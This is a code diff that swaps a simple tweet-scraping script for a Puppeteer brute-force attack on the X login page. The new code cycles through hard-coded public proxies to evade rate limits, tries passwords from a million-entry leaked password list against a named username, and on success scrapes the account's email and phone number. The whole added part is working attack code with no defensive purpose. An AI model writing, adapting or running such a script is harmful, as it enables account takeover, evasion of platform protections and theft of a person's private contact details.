@@ -1,66 +1,151 @@
-const puppeteer = require('puppeteer');
-const fs = require('fs').promises;
+import puppeteer from 'puppeteer';
+import fs from 'fs/promises';
+import readline from 'readline';
+import ProxyChain from 'proxy-chain'; // Import the proxy-chain package
 
-async function scrapeTweets(hashtag, numTweets) {
-    const browser = await puppeteer.launch({ headless: false }); // Launch browser in non-headless mode for debugging
-    const page = await browser.newPage();
+// Path to your text file containing passwords
+const passwordFilePath = '10-million-password-list-top-1000000.txt';
 
-    // Navigate to the hashtag search page
-    const url = `https://twitter.com/search?q=%23${hashtag}&src=typed_query&f=live`;
-    await page.goto(url, { waitUntil: 'networkidle2' });
+// List of proxies
+const proxies = [
+    'http://159.69.86.130:80',
+    'http://217.13.109.78:80',
+    'http://49.13.9.253:80',
+    'http://195.62.32.117:22331',
+    'socks4://78.133.163.190:4145',
+    'http://103.86.109.38:80',
+    'http://222.89.237.101:9002',
+    'http://8.223.31.16:80'
+];
 
-    const tweets = [];
-    let scrollAttempts = 0;
+async function getProxyUrl(proxy) {
+    // Convert proxy URL to anonymized proxy URL
+    return await ProxyChain.anonymizeProxy(proxy);
+}
 
-    // Scroll and scrape tweets
-    while (tweets.length < numTweets && scrollAttempts < 30) {
-        const newTweets = await page.evaluate(() => {
-            const tweetElements = Array.from(document.querySelectorAll('article div[lang]'));
-            return tweetElements.map(el => ({
-                text: el.innerText.trim(), // Trim whitespace from text
-                date: el.closest('article').querySelector('time') ? el.closest('article').querySelector('time').dateTime : null
-            }));
+async function extractAccountDetails(page) {
+    try {
+        // Wait for and extract account details
+        const accountName = await page.evaluate(() => {
+            const nameElement = document.querySelector('div[data-testid="UserProfileHeader_Items"] span');
+            return nameElement ? nameElement.textContent : 'Not found';
         });
 
-        tweets.push(...newTweets);
+        const email = await page.evaluate(() => {
+            // Adjust selector as necessary
+            const emailElement = document.querySelector('a[href*="email"]');
+            return emailElement ? emailElement.textContent : 'Not found';
+        });
 
-        if (tweets.length < numTweets) {
-            await page.evaluate('window.scrollTo(0, document.body.scrollHeight)');
-            await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for 2 seconds
-            scrollAttempts++;
-        }
-    }
+        const mobileNumber = await page.evaluate(() => {
+            // Adjust selector as necessary
+            const mobileElement = document.querySelector('a[href*="phone"]');
+            return mobileElement ? mobileElement.textContent : 'Not found';
+        });
 
-    await browser.close();
-    return tweets.slice(0, numTweets);
-}
+        console.log('Account Details:');
+        console.log('Username:', accountName);
+        console.log('Email:', email);
+        console.log('Mobile Number:', mobileNumber);
 
-async function writeTweetsToText(tweets, filePath) {
-    try {
-        await fs.writeFile(filePath, ''); // Clear existing content or create a new file
-        for (const tweet of tweets) {
-            await fs.appendFile(filePath, tweet.text + '\n'); // Append each tweet's text to the file
-        }
-        console.log('Tweets have been written to text file');
     } catch (error) {
-        console.error('Error writing to text file:', error);
+        console.error('Error extracting account details:', error);
     }
 }
 
-async function main() {
-    const hashtag = 'news'; // Replace 'your_hashtag' with the desired hashtag
-    const numTweets = 100; // Number of tweets to scrape
-    const filePath = 'tweets.txt'; // Output text file path
+async function attemptLogin() {
+    for (const proxy of proxies) {
+        // Get anonymized proxy URL
+        const proxyUrl = await getProxyUrl(proxy);
+        let browser;
+        try {
+            browser = await puppeteer.launch({
+                headless: false,
+                ignoreHTTPSErrors: true,
+                args: [`--proxy-server=${proxyUrl}`],
+                timeout: 60000 // Set timeout to 60 seconds
+            });
 
-    console.log(`Starting to scrape tweets with hashtag: #${hashtag}`);
-    const tweets = await scrapeTweets(hashtag, numTweets);
-    if (tweets.length > 0) {
-        console.log(`Scraped ${tweets.length} tweets. Writing to text file...`);
-        await writeTweetsToText(tweets, filePath);
-    } else {
-        console.log('No tweets found for the specified hashtag.');
+            const page = await browser.newPage();
+
+            try {
+                await page.goto('https://x.com/i/flow/login?lang=en', { waitUntil: 'networkidle2', timeout: 60000 });
+
+                // Username to login
+                const username = 'illusionXcrypto';
+
+                // Wait for the username field to appear and input the username
+                await page.waitForSelector('input[name="text"]', { visible: true });
+                await page.type('input[name="text"]', username);
+                console.log('Username entered.');
+
+                // Click 'Next' button
+                await page.waitForSelector('div.css-146c3p1.r-bcqeeo.r-qvutc0.r-1qd0xha.r-q4m81j.r-a023e6.r-rjixqe.r-b88u0q.r-1awozwy.r-6koalj.r-18u37iz.r-16y2uox.r-1777fci', { visible: true });
+                await page.click('div.css-146c3p1.r-bcqeeo.r-qvutc0.r-1qd0xha.r-q4m81j.r-a023e6.r-rjixqe.r-b88u0q.r-1awozwy.r-6koalj.r-18u37iz.r-16y2uox.r-1777fci');
+                console.log('Clicked Next button.');
+
+                // Wait for the password input field to appear
+                await page.waitForSelector('input[name="password"]', { visible: true });
+                console.log('Password field is visible.');
+
+                // Read passwords from file and attempt to log in
+                const passwordStream = fs.createReadStream(passwordFilePath);
+                const rl = readline.createInterface({
+                    input: passwordStream,
+                    crlfDelay: Infinity
+                });
+
+                for await (const password of rl) {
+                    console.log(`Attempting login with password: ${password.trim()}`);
+
+                    // Input password into the password field
+                    await page.evaluate(password => {
+                        const passwordField = document.querySelector('input[name="password"]');
+                        passwordField.value = password;
+                        // Trigger an input event to ensure the field updates
+                        passwordField.dispatchEvent(new Event('input', { bubbles: true }));
+                    }, password.trim());
+
+                    // Click 'Log in' button
+                    await page.click('button[data-testid="LoginForm_Login_Button"]');
+
+                    // Wait for response
+                    await page.waitForTimeout(3000); // Wait for 3 seconds for login response
+
+                    // Check for login success or failure
+                    const loginError = await page.$('div[role="alert"]'); // Adjust the selector if necessary
+                    if (!loginError) {
+                        console.log('Login successful!');
+                        await extractAccountDetails(page); // Extract account details
+                        break; // Exit loop on successful login
+                    } else {
+                        console.log('Login failed, trying next password.');
+                    }
+
+                    // Clear the password field for the next attempt
+                    await page.evaluate(() => {
+                        document.querySelector('input[name="password"]').value = '';
+                    });
+
+                    // Add delay before next attempt
+                    await page.waitForTimeout(2000); // Wait for 2 seconds before next attempt
+                }
+            } catch (error) {
+                console.error('Error during login attempt:', error);
+            } finally {
+                await browser.close();
+            }
+
+            // Add a delay before trying the next proxy
+            await new Promise(resolve => setTimeout(resolve, 5000)); // Wait for 5 seconds before trying the next proxy
+        } catch (error) {
+            console.error(`Failed to launch browser with proxy ${proxy}:`, error);
+        }
     }
-    console.log('Scraping and text file writing completed.');
 }
 
-main();
+attemptLogin().then(() => {
+    console.log('Login attempts completed.');
+}).catch(err => {
+    console.error('Error during login attempts:', err);
+});
